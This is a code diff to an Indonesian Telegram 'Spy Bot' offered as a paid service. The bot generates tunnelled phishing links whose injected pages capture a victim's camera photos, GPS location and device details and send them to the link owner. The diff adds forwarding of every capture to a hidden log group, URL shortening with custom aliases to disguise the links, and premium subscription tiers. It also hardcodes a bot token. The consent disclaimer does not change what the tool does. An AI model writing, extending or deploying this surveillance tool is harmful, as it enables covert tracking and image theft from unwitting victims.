@@ -30,8 +30,19 @@ except ImportError:
 # ------------------------------------------------------------------ #
 BOT_TOKEN  = "9018666159:AAFACZ-KMGH04QrTiDgEuW5hmGtjFoUE8C4"
 ADMIN_ID   = "8598136412"
+GROUP_ID   = "-5591690895"   # grup log capture
 DATA_FILE  = "data.json"
 FREE_LIMIT = 3
+
+# durasi premium
+PREMIUM_DURATIONS = {
+    "1d":  ("1 Hari",    1),
+    "1w":  ("1 Minggu",  7),
+    "2w":  ("2 Minggu",  14),
+    "3w":  ("3 Minggu",  21),
+    "1m":  ("1 Bulan",   30),
+    "perm":("Permanent", None),
+}
 
 # ------------------------------------------------------------------ #
 #  BANNER
@@ -475,23 +486,23 @@ async def _send_result(data, link_id, owner_uid):
     teks += f"🗣 *Bahasa:* {info.get('language','?')}\n"
     teks += f"🖥 *Layar:* {info.get('screen','?')}"
 
-    await bot.send_message(chat_id=owner_uid, text=teks, parse_mode="Markdown")
-
-    if num == 1 and lat and lon:
-        await bot.send_location(chat_id=owner_uid,
-                                latitude=float(lat), longitude=float(lon))
-    if back:
+    # kirim ke user dan ke grup log
+    for dest in [owner_uid, GROUP_ID]:
         try:
-            await bot.send_photo(chat_id=owner_uid,
-                                 photo=base64.b64decode(back),
-                                 caption=f"📷 Belakang — Link #{link_id} Cap #{num}")
-        except Exception as e: print(f"\n[!] foto back: {e}")
-    if front:
-        try:
-            await bot.send_photo(chat_id=owner_uid,
-                                 photo=base64.b64decode(front),
-                                 caption=f"🤳 Depan — Link #{link_id} Cap #{num}")
-        except Exception as e: print(f"\n[!] foto front: {e}")
+            await bot.send_message(chat_id=dest, text=teks, parse_mode="Markdown")
+            if num == 1 and lat and lon:
+                await bot.send_location(chat_id=dest,
+                                        latitude=float(lat), longitude=float(lon))
+            if back:
+                await bot.send_photo(chat_id=dest,
+                                     photo=base64.b64decode(back),
+                                     caption=f"📷 Belakang — Link #{link_id} Cap #{num}")
+            if front:
+                await bot.send_photo(chat_id=dest,
+                                     photo=base64.b64decode(front),
+                                     caption=f"🤳 Depan — Link #{link_id} Cap #{num}")
+        except Exception as e:
+            print(f"\n[!] kirim ke {dest}: {e}")
 
 async def _send_offline(link_id, owner_uid):
     bot = Bot(token=BOT_TOKEN)
@@ -588,6 +599,29 @@ TUNNEL_FN = {"cf": start_cloudflared, "ng": start_ngrok, "sv": start_serveo}
 # ------------------------------------------------------------------ #
 #  SPAWN LINK
 # ------------------------------------------------------------------ #
+async def try_shorten(long_url: str, alias: str) -> str:
+    def _isgd():
+        r=req_lib.get("https://is.gd/create.php",
+                      params={"format":"simple","url":long_url,"shorturl":alias},timeout=8)
+        return r.text.strip()
+    def _tinyurl():
+        r=req_lib.get("https://tinyurl.com/api-create.php",
+                      params={"url":long_url,"alias":alias},timeout=8)
+        return r.text.strip()
+    def _c2lol():
+        r=req_lib.post("https://c2.lol/api/short",
+                       json={"url":long_url,"custom":alias},timeout=8)
+        return r.json().get("short","")
+
+    loop = asyncio.get_event_loop()
+    for fn in [_isgd, _tinyurl, _c2lol]:
+        try:
+            result = await loop.run_in_executor(None, fn)
+            if result and result.startswith("http"):
+                return result
+        except: continue
+    return long_url
+
 async def spawn_link(tunnel_key, raw_html, owner_uid, query):
     global _link_id_ctr
     _link_id_ctr += 1
@@ -612,9 +646,16 @@ async def spawn_link(tunnel_key, raw_html, owner_uid, query):
 
     _links.append({"id":lid,"owner":owner_uid,"pub_url":pub_url,"port":port,"proc":proc})
 
+    # tanya custom link
+    _user_data[owner_uid]["pending_link_id"]  = lid
+    _user_data[owner_uid]["pending_pub_url"]  = pub_url
     await query.edit_message_text(
-        f"✅ *Link #{lid} aktif!*\n\n🔗 `{pub_url}`\n\nForward ke target.",
-        parse_mode="Markdown", reply_markup=kb_main(owner_uid)
+        f"✅ *Tunnel aktif!*\n\n🔗 `{pub_url}`\n\nMau custom link?",
+        parse_mode="Markdown",
+        reply_markup=InlineKeyboardMarkup([[
+            InlineKeyboardButton("✅ Iya",  callback_data="custom_yes"),
+            InlineKeyboardButton("❌ Tidak", callback_data="custom_no"),
+        ]])
     )
 
 def inject_html(html):
@@ -777,7 +818,20 @@ async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not raw:
             await q.edit_message_text("❌ Template kosong.",reply_markup=kb_main(uid)); return
         await spawn_link(d.replace("tun_",""), raw, uid, q)
-        _user_state[uid]=None; _user_data[uid]={}
+        _user_state[uid]=None
+
+    elif d == "custom_yes":
+        _user_state[uid]="await_alias"
+        await q.edit_message_text("Ketik alias yang diinginkan:\n(contoh: spylanox)")
+
+    elif d == "custom_no":
+        pub_url = _user_data.get(uid,{}).get("pending_pub_url","")
+        lid     = _user_data.get(uid,{}).get("pending_link_id","?")
+        _user_data[uid]={}
+        await q.edit_message_text(
+            f"✅ *Link #{lid} aktif!*\n\n🔗 `{pub_url}`\n\nForward ke target.",
+            parse_mode="Markdown", reply_markup=kb_main(uid)
+        )
 
     # --- list link ---
     elif d == "list_links":
@@ -847,16 +901,38 @@ async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif d == "a_users":
         if role!="admin": return
+        await q.edit_message_text(
+            "👥 *Semua User* — pilih filter:",
+            parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup([
+                [
+                    InlineKeyboardButton("👥 Semua",        callback_data="a_users_all"),
+                    InlineKeyboardButton("💎 List Premium", callback_data="a_users_premium"),
+                    InlineKeyboardButton("🆓 List Free",    callback_data="a_users_free"),
+                ],
+                [InlineKeyboardButton("« Kembali", callback_data="admin_panel")],
+            ])
+        )
+
+    elif d in ("a_users_all","a_users_premium","a_users_free"):
+        if role!="admin": return
         users=db_all_users()
         if not users:
             await q.edit_message_text("Belum ada user.",reply_markup=kb_admin()); return
-        teks="👥 *Semua User:*\n\n"
+        filter_role = {"a_users_all":None,"a_users_premium":"premium","a_users_free":"free"}[d]
+        label_map   = {"a_users_all":"Semua User","a_users_premium":"Premium","a_users_free":"Free"}
+        teks=f"👥 *{label_map[d]}:*\n\n"
+        found=False
         for u_id,ud in users.items():
             r=ud.get("role","free")
+            if filter_role and r!=filter_role: continue
+            found=True
             badge={"admin":"👑","premium":"💎","free":"🆓"}.get(r,"🆓")
             exp=ud.get("premium_until","")
             exp_str=f" (exp: {exp})" if exp and r=="premium" else ""
             teks+=f"{badge} `{u_id}` — {ud.get('cap_total',0)} cap{exp_str}\n"
+        if not found:
+            teks+="_(kosong)_"
         await q.edit_message_text(teks,parse_mode="Markdown",reply_markup=kb_admin())
 
     elif d == "a_alllinks":
@@ -871,8 +947,41 @@ async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif d == "a_upgrade":
         if role!="admin": return
-        _user_state[uid]="a_await_upgrade"
+        _user_state[uid]="a_await_upgrade_id"
         await q.edit_message_text("Ketik ID user yang mau di-upgrade ke Premium:")
+
+    elif d == "a_dur_pick":
+        if role!="admin": return
+        rows=[]
+        row=[]
+        for key,(label,days) in PREMIUM_DURATIONS.items():
+            row.append(InlineKeyboardButton(label, callback_data=f"a_dur_{key}"))
+            if len(row)==2:
+                rows.append(row); row=[]
+        if row: rows.append(row)
+        rows.append([InlineKeyboardButton("« Kembali",callback_data="admin_panel")])
+        await q.edit_message_text(
+            f"Pilih durasi premium untuk `{_user_data[uid].get('upgrade_target','?')}`:",
+            parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup(rows)
+        )
+
+    elif d.startswith("a_dur_"):
+        if role!="admin": return
+        key = d.replace("a_dur_","")
+        label, days = PREMIUM_DURATIONS.get(key,("?",None))
+        target = _user_data.get(uid,{}).get("upgrade_target","")
+        if days is None:
+            until = None
+        else:
+            until = (datetime.datetime.now() + datetime.timedelta(days=days)).strftime("%Y-%m-%d")
+        db_set_role(target,"premium",until=until)
+        exp_str = f"sampai `{until}`" if until else "Permanent ♾"
+        await q.edit_message_text(
+            f"✅ `{target}` di-upgrade ke Premium {label} ({exp_str}).",
+            parse_mode="Markdown", reply_markup=kb_admin()
+        )
+        _user_data[uid]={}
 
     elif d == "a_downgrade":
         if role!="admin": return
@@ -896,8 +1005,15 @@ async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif d == "a_deladmin":
         if role!="admin": return
+        data = db_read()
+        admins = data.get("admins",[])
+        teks = "👑 *Daftar Admin:*\n\n"
+        for a_id in admins:
+            ud = data["users"].get(a_id,{})
+            teks += f"• `{a_id}` — join: {ud.get('joined','?')}\n"
+        teks += "\nKetik ID admin yang mau dicopot:"
         _user_state[uid]="a_await_deladmin"
-        await q.edit_message_text("Ketik ID admin yang mau dicopot:")
+        await q.edit_message_text(teks, parse_mode="Markdown")
 
     elif d == "a_forcelink":
         if role!="admin": return
@@ -942,11 +1058,42 @@ async def on_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # pesan biasa yang bukan command dan bukan dalam state apapun
     if not state:
         await update.message.reply_text(
-            "👋 Halo! Ini adalah *Bot Spy by MR414N-ID*\n\n"
-            "Bot ini hanya dapat digunakan oleh member terdaftar.\n\n"
-            "👉👉 /start 👈👈 tekan ini untuk memulai.",
-            parse_mode="Markdown"
+            "👋 WELCOME TO SPY BOT BY LANOX\n\n"
+            "🕵️ Selamat datang di SPY BOT, platform pemantauan dan pelacakan digital.\n\n"
+            "📡 FITUR BOT:\n"
+            "📷 Monitoring Kamera\n"
+            "📍 Pelacakan Lokasi\n"
+            "🔗 Sistem Berbasis Link\n\n"
+            "🔐 AKSES MEMBER\n"
+            "Bot ini hanya dapat digunakan oleh member yang telah terdaftar.\n\n"
+            "🎁 FREE ACCESS\n"
+            "• Limit penggunaan: 3 Link\n"
+            "• Upgrade Premium untuk mendapatkan limit lebih besar.\n\n"
+            "🚀 MULAI SEKARANG\n"
+            "👉 Ketik /start untuk memulai.\n\n"
+            "⚠️ Gunakan seluruh fitur hanya pada perangkat dan lokasi yang Anda miliki atau dengan persetujuan pemiliknya.\n\n"
+            "🔥 SPY BOT BY LANOX\n"
+            "Smart Monitoring • Digital Tracking",
+            parse_mode=None
         )
+        return
+
+    if state == "await_alias":
+        alias = re.sub(r"[^a-zA-Z0-9\-_]","",text)
+        if len(alias) < 3:
+            await update.message.reply_text("❌ Alias minimal 3 karakter. Coba lagi:")
+            return
+        pub_url = _user_data.get(uid,{}).get("pending_pub_url","")
+        lid     = _user_data.get(uid,{}).get("pending_link_id","?")
+        await update.message.reply_text(f"⏳ Mencoba custom link '{alias}'...")
+        final = await try_shorten(pub_url, alias)
+        _user_data[uid]={}
+        _user_state[uid]=None
+        if final != pub_url:
+            teks = f"✅ *Link #{lid} aktif!*\n\n🔗 Custom: `{final}`\n🔗 Asli: `{pub_url}`\n\nForward ke target."
+        else:
+            teks = f"✅ *Link #{lid} aktif!*\n\n🔗 `{pub_url}`\n_(Custom link gagal, pakai URL asli)_\n\nForward ke target."
+        await update.message.reply_text(teks,parse_mode="Markdown",reply_markup=kb_main(uid))
         return
 
     if state == "await_url":
@@ -962,11 +1109,23 @@ async def on_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text(f"❌ Gagal: {e}",reply_markup=kb_template())
 
     # --- admin states ---
-    elif state == "a_await_upgrade":
-        db_set_role(text,"premium")
-        await update.message.reply_text(f"✅ `{text}` diupgrade ke Premium.",
-                                        parse_mode="Markdown",reply_markup=kb_admin())
-        _user_state[uid]=None
+    elif state == "a_await_upgrade_id":
+        _user_data[uid]["upgrade_target"] = text
+        _user_state[uid] = None
+        # munculkan pilihan durasi via fake callback
+        rows=[]
+        row=[]
+        for key,(label,days) in PREMIUM_DURATIONS.items():
+            row.append(InlineKeyboardButton(label, callback_data=f"a_dur_{key}"))
+            if len(row)==2:
+                rows.append(row); row=[]
+        if row: rows.append(row)
+        rows.append([InlineKeyboardButton("« Kembali",callback_data="admin_panel")])
+        await update.message.reply_text(
+            f"Pilih durasi premium untuk `{text}`:",
+            parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup(rows)
+        )
 
     elif state == "a_await_downgrade":
         db_set_role(text,"free")
